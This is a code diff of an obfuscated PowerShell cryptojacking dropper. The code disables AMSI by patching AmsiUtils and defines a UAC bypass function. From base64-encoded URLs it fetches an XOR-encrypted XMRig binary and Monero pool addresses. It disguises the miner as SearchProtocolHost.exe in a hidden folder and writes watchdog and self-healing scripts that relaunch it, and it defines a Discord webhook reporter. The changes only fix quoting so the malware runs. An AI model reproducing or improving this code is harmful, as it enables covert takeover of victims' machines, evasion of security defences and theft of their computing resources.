@@ -1,6 +1,3 @@
-${function:X}={param([string]$s);$b=[Convert]::FromBase64String($s);[Text.Encoding]::UTF8.GetString($b)}
-$_k=[byte[]](0x4D,0x79,0x53,0x65,0x63,0x72,0x65,0x74,0x4B,0x65,0x79,0x31,0x32,0x33,0x34,0x35)
-
 try{
 $d=[Ref].Assembly.GetType('System.Management.Automation.Am'+'siU'+'tils')
 $f=$d.GetField('am'+'siIn'+'itFailed','NonPublic,Static')
@@ -16,9 +13,6 @@ $p=[Runtime.InteropServices.Marshal]::GetFunctionPointerForDelegate($m)
 }catch{}
 
 $wc=New-Object Net.WebClient
-${function:X}={param([string]$s);$b=[Convert]::FromBase64String($s);[Text.Encoding]::UTF8.GetString($b)}
-$_k=[byte[]](0x4D,0x79,0x53,0x65,0x63,0x72,0x65,0x74,0x4B,0x65,0x79,0x31,0x32,0x33,0x34,0x35)
-
 function X([string]$s){$b=[Convert]::FromBase64String($s);return [Text.Encoding]::UTF8.GetString($b)}
 function XorDec([byte[]]$d,[byte[]]$k){$o=New-Object byte[] $d.Length;for($i=0;$i -lt $d.Length;$i++){$o[$i]=$d[$i] -bxor $k[$i % $k.Length]};return $o}
 
@@ -28,7 +22,7 @@ $_pb='cG9vbC5zdXBwb3J0eG1yLmNvbTo0NDM='
 $_e='aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL21hcm96MTIzL0Zvb3RiYWxsL21haW4veG1yaWdfZW5jLmJpbg=='
 $_d='aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTU1MDkzNzk2MjE3MzE2OTgwNC9ILVdMLW1jUFlqQW5ESDJyaHh5MnVNV2w4U0lkbmN5dE5JMWNuWEhaTkVwaWo2YlI2Y0NhTzNFaER1bHEzMUtCSjZRVA=='
 $_x='TXlTZWNyZXRLZXkxMjM0NQ=='
-$_s="`$env:LOCALAPPDATA\Microsoft\Windows\NetworkService\cache"
+$_s="$env:LOCALAPPDATA\Microsoft\Windows\NetworkService\cache"
 $_m="SearchProtocolHost.exe"
 
 function Invoke-UACBypass{
@@ -69,38 +63,8 @@ $dec=XorDec $enc $key
 function Write-MinerConfig{
 $p=(X $_u)
 $pl=(X $_p)
-$cfg=@"{
-"api-mode": null,
-"donate-level": 0,
-"donate-over-proxy": 0,
-"log-file": null,
-"print-time": 60,
-"health-print-time": 60,
-"retries": 5,
-"retry-pause": 5,
-"syslog": false,
-"watch": true,
-"opencl-platform": -1,
-"algo": "rx/0",
-"coins": "monero",
-"pools": [
-{
-"url": "$pl",
-"user": "$p",
-"keepalive": true,
-"tls": true,
-"tls-fingerprint": null
-},
-{
-"url": "$(X $_pb)",
-"user": "$p",
-"keepalive": true,
-"tls": true,
-"tls-fingerprint": null
-}
-],
-"cpu": true
-}@
+$pb=(X $_pb)
+$cfg='{"api-mode":null,"donate-level":0,"donate-over-proxy":0,"log-file":null,"print-time":60,"health-print-time":60,"retries":5,"retry-pause":5,"syslog":false,"watch":true,"opencl-platform":-1,"algo":"rx/0","coins":"monero","pools":[{"url":"' + $pl + '","user":"' + $p + '","keepalive":true,"tls":true,"tls-fingerprint":null},{"url":"' + $pb + '","user":"' + $p + '","keepalive":true,"tls":true,"tls-fingerprint":null}],"cpu":true}'
 $cfg|Out-File -FilePath "$_s\config.json" -Encoding UTF8 -Force
 }
 
@@ -126,50 +90,67 @@ $s.Save()
 }
 
 function Write-StealthWatchdog{
-$watchdogScript=@"
-`$ErrorActionPreference='SilentlyContinue'
-while(`$true){
-`$proc=Get-Process -Name 'SearchProtocolHost' -ErrorAction SilentlyContinue
-if(!`$proc){
-Start-Process powershell.exe -ArgumentList "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$_s\miner.ps1`"" -WindowStyle Hidden
-}
-Start-Sleep 60
-}
-"@
-$watchdogScript|Out-File -FilePath "$_s\watchdog.ps1" -Encoding UTF8 -Force
+$w="# watchdog"
+$w+='
+`$ErrorActionPreference=''SilentlyContinue'''
+$w+='
+while(`$true){'
+$w+='
+`$proc=Get-Process -Name ''SearchProtocolHost'' -ErrorAction SilentlyContinue'
+$w+='
+if(!`$proc){'
+$w+='
+Start-Process powershell.exe -ArgumentList "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"'+$_s+'\miner.ps1`"" -WindowStyle Hidden'
+$w+='
+}'
+$w+='
+Start-Sleep 60'
+$w+='
+}'
+$w|Out-File -FilePath "$_s\watchdog.ps1" -Encoding UTF8 -Force
 }
 
 function Write-SelfHealScript{
-$minerScript=@"
-`$ErrorActionPreference='SilentlyContinue'
-Start-Sleep 10
-`$k=[byte[]](0x4D,0x79,0x53,0x65,0x63,0x72,0x65,0x74,0x4B,0x65,0x79,0x31,0x32,0x33,0x34,0x35)
-`$_e='aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL21hcm96MTIzL0Zvb3RiYWxsL21haW4veG1yaWdfZW5jLmJpbg=='
-`$_u='NTY3ZzFtZWl6RmUzMUd6Rk1HN3hveTN5eFRoRzU2cDdOTnp1dEtmZjdZUGkxRGFkQWRya1kyeExqOXpMV2paTm00aGZYb0YydXhhNlBnSkNXUWM2UVVoNjROR3BYRUw='
-`$_p='cG9vbC5oYXNodmF1bHQucHJvOjQ0Mw=='
-`$_pb='cG9vbC5zdXBwb3J0eG1yLmNvbTo0NDM='
-`$wc=New-Object Net.WebClient
-function X([string]`$s){[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String(`$s))}
-function XorDec([byte[]]`$d,[byte[]]`$k){`$o=New-Object byte[] `$_d.Length;for(`$i=0;`$i -lt `$_d.Length;`$i++){`$_o[`$i]=`$_d[`$i] -bxor `$_k[`$i % `$_k.Length]};return `$_o}
-`$_s="`$env:LOCALAPPDATA\Microsoft\Windows\NetworkService\cache"
-`$_m="SearchProtocolHost.exe"
-if(!(Test-Path `$_s)){New-Item -Path `$_s -ItemType Directory -Force|Out-Null}
-Set-ItemProperty `$_s -Name Attributes -Value 'Hidden,System' -ErrorAction SilentlyContinue
-`$enc=`$wc.DownloadData((X `$_e))
-`$dec=XorDec `$_enc `$_k
-[System.IO.File]::WriteAllBytes("`$_s\`$_m",`$dec)
-`$p=(X `$_u)
-`$pl=(X `$_p)
-`$cfg=@"{
-"api-mode": null,
-"donate-level": 0,
-"pools": [{"url": "`$pl","user": "`$p","keepalive": true,"tls": true}],
-"cpu": true
-}@
-`$cfg|Out-File -FilePath "`$_s\config.json" -Encoding UTF8 -Force
-Start-Process -FilePath "`$_s\`$_m" -ArgumentList "-c `$_s\config.json" -WindowStyle Hidden
-"@
-$minerScript|Out-File -FilePath "$_s\miner.ps1" -Encoding UTF8 -Force
+$m='# miner'
+$m+='
+`$ErrorActionPreference=''SilentlyContinue'''
+$m+='
+Start-Sleep 10'
+$m+='
+`$k=[byte[]](0x4D,0x79,0x53,0x65,0x63,0x72,0x65,0x74,0x4B,0x65,0x79,0x31,0x32,0x33,0x34,0x35)'
+$m+='
+function X([string]`$s){[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String(`$s))}'
+$m+='
+function XorDec([byte[]]`$d,[byte[]]`$k){`$o=New-Object byte[] `$d.Length;for(`$i=0;`$i -lt `$d.Length;`$i++){`$o[`$i]=`$d[`$i] -bxor `$k[`$i % `$k.Length]};return `$o}'
+$m+='
+`$wc=New-Object Net.WebClient'
+$m+='
+`$enc=`$wc.DownloadData((X ''aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL21hcm96MTIzL0Zvb3RiYWxsL21haW4veG1yaWdfZW5jLmJpbg==''))'
+$m+='
+`$dec=XorDec `$enc `$k'
+$m+='
+`$_s="`$env:LOCALAPPDATA\Microsoft\Windows\NetworkService\cache"'
+$m+='
+`$_m="SearchProtocolHost.exe"'
+$m+='
+if(!(Test-Path `$_s)){New-Item -Path `$_s -ItemType Directory -Force|Out-Null}'
+$m+='
+Set-ItemProperty `$_s -Name Attributes -Value ''Hidden,System'' -ErrorAction SilentlyContinue'
+$m+='
+[System.IO.File]::WriteAllBytes("`$_s\`$_m",`$dec)'
+$m+='
+`$p=(X ''NTY3ZzFtZWl6RmUzMUd6Rk1HN3hveTN5eFRoRzU2cDdOTnp1dEtmZjdZUGkxRGFkQWRya1kyeExqOXpMV2paTm00aGZYb0YydXhhNlBnSkNXUWM2UVVoNjROR3BYRUw='')'
+$m+='
+`$pl=(X ''cG9vbC5oYXNodmF1bHQucHJvOjQ0Mw=='')'
+$m+='
+`$pb=(X ''cG9vbC5zdXBwb3J0eG1yLmNvbTo0NDM='')'
+$m+='
+`$cfg=''{''''api-mode'''':null,''''donate-level'''':0,''''pools'''':[{''''url'''':""'' + $pl + ''","'''user'''':""'' + $p + ''","'''keepalive'''':true,''''tls'''':true}],''''cpu'''':true}'''
+$m+='
+`$cfg|Out-File -FilePath "`$_s\config.json" -Encoding UTF8 -Force'
+$m+='
+Start-Process -FilePath "`$_s\`$_m" -ArgumentList "-c `$_s\config.json" -WindowStyle Hidden'
+$m|Out-File -FilePath "$_s\miner.ps1" -Encoding UTF8 -Force
 }
 
 function Send-DiscordWebhook{
